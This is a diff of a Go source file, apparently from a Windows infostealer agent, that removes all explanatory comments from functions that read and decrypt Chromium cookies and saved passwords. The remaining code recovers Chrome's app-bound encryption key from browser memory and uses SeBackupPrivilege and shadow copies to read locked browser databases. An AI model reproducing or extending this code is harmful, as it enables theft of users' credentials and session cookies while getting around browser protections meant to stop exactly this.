@@ -13,8 +13,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// Cookie es una cookie de un perfil Chromium ya descifrada, con la URL de la
-// página a la que pertenece.
 type Cookie struct {
 	Browser    string
 	Profile    string
@@ -27,11 +25,10 @@ type Cookie struct {
 	Session    bool
 	Secure     bool
 	HTTPOnly   bool
-	Locked     bool // v20 sin clave app-bound: valor no descifrable
+	Locked     bool
 	DecryptErr string
 }
 
-// Login es una credencial guardada en un Login Data.
 type Login struct {
 	Browser  string
 	Profile  string
@@ -41,14 +38,8 @@ type Login struct {
 	Error    string
 }
 
-// chromeEpoch es la diferencia en segundos entre 1601-01-01 y 1970-01-01.
-// Chrome guarda microsegundos desde 1601.
 const chromeEpoch = 11644473600
 
-// ReadCookies abre la base Cookies del perfil y devuelve todas las filas con su
-// URL. El valor se descifra con las claves del Local State; las cookies v20 sin
-// clave app-bound se devuelven marcadas en vez de descartarse, para que la URL y
-// el nombre lleguen igual.
 func ReadCookies(profile ChromeProfile, keys ChromeKeys) ([]Cookie, error) {
 	if profile.Cookies == "" {
 		return nil, errors.New("chrome: el perfil no tiene base de cookies")
@@ -88,8 +79,6 @@ func ReadCookies(profile ChromeProfile, keys ChromeKeys) ([]Cookie, error) {
 		return nil, fmt.Errorf("chrome: esquema inesperado en cookies (%d columnas)", len(columns))
 	}
 
-	// Tope de filas: un perfil normal tiene miles; uno corrupto no puede
-	// arrastrar al agente a leer un millón de registros.
 	rows, err := db.ReadTable(table.RootPage, 100000)
 	if err != nil {
 		return nil, err
@@ -102,9 +91,6 @@ func ReadCookies(profile ChromeProfile, keys ChromeKeys) ([]Cookie, error) {
 		}
 	}
 
-	// Chrome 127+ cifra todo con la clave app-bound, que no se puede desenvolver
-	// en disco. Se busca una vez en la memoria del navegador y se reutiliza para
-	// todas las filas de este perfil.
 	if len(keys.AppBound) != 32 && blobIndex >= 0 {
 		if sample := firstAppBound(rows, blobIndex); sample != nil {
 			if recovered, recoverErr := AppBoundKey(profile.Browser, sample); recoverErr == nil {
@@ -166,7 +152,6 @@ func ReadCookies(profile ChromeProfile, keys ChromeKeys) ([]Cookie, error) {
 	return out, nil
 }
 
-// ReadLogins abre el Login Data y devuelve cada credencial con su URL.
 func ReadLogins(profile ChromeProfile, keys ChromeKeys) ([]Login, error) {
 	if profile.LoginData == "" {
 		return nil, errors.New("chrome: el perfil no tiene Login Data")
@@ -244,10 +229,6 @@ func ReadLogins(profile ChromeProfile, keys ChromeKeys) ([]Login, error) {
 	return out, nil
 }
 
-// CopyBrowserDB copia una base SQLite de Chromium junto con sus sidecars a un
-// temporal. Con el navegador cerrado basta una lectura normal; con el navegador
-// abierto el original está bloqueado sin permiso de lectura y hay que pasar por
-// una copia de sombra del volumen.
 func CopyBrowserDB(src string) (string, func(), error) {
 	name, cleanup, err := copyTemp(src)
 	if err == nil {
@@ -267,8 +248,6 @@ func CopyBrowserDB(src string) (string, func(), error) {
 	return copyTemp(shadowSrc)
 }
 
-// copyTemp copia el archivo y sus sidecars a un temporal y devuelve el nombre y
-// la limpieza.
 func copyTemp(src string) (string, func(), error) {
 	out, err := os.CreateTemp("", "govoid_db_*.db")
 	if err != nil {
@@ -325,10 +304,6 @@ func copyPath(src, dst string) error {
 	return out.Close()
 }
 
-// openSharedRead abre un archivo que otro proceso mantiene abierto. Chrome abre
-// sus bases sin FILE_SHARE_READ, así que una lectura normal falla con
-// "being used by another process"; con SeBackupPrivilege y
-// FILE_FLAG_BACKUP_SEMANTICS el gestor de E/S salta esa comprobación.
 func openSharedRead(path string) (*os.File, error) {
 	_ = enablePrivilege("SeBackupPrivilege")
 
@@ -350,7 +325,6 @@ func openSharedRead(path string) (*os.File, error) {
 	return os.NewFile(uintptr(handle), path), nil
 }
 
-// chromeTime convierte microsegundos desde 1601 a tiempo local.
 func chromeTime(micros int64) time.Time {
 	seconds := micros/1000000 - chromeEpoch
 	if seconds <= 0 {
@@ -359,8 +333,6 @@ func chromeTime(micros int64) time.Time {
 	return time.Unix(seconds, 0)
 }
 
-// cookieURL arma la URL de la página de la que salió la cookie: esquema según
-// source_scheme, host sin el punto inicial y el path de la cookie.
 func cookieURL(host, path string, row []SQLiteValue, schemeIndex int) string {
 	scheme := "https"
 	if schemeIndex >= 0 && schemeIndex < len(row) && row[schemeIndex].Int == 1 {
@@ -379,13 +351,10 @@ func cookieURL(host, path string, row []SQLiteValue, schemeIndex int) string {
 	return scheme + "://" + host + path
 }
 
-// isAppBound distingue un valor v20 (cifrado app-bound, necesita el servicio de
-// elevación de Chrome) de un fallo de descifrado normal.
 func isAppBound(blob []byte) bool {
 	return len(blob) >= 3 && string(blob[:3]) == "v20"
 }
 
-// ColumnNames saca los nombres de columna del CREATE TABLE.
 func ColumnNames(ddl string) []string {
 	start := strings.Index(ddl, "(")
 	end := strings.LastIndex(ddl, ")")
@@ -410,7 +379,6 @@ func ColumnNames(ddl string) []string {
 	return names
 }
 
-// IndexOfColumn devuelve la posición de una columna, o -1.
 func IndexOfColumn(columns []string, target string) int {
 	for index, value := range columns {
 		if strings.EqualFold(value, target) {
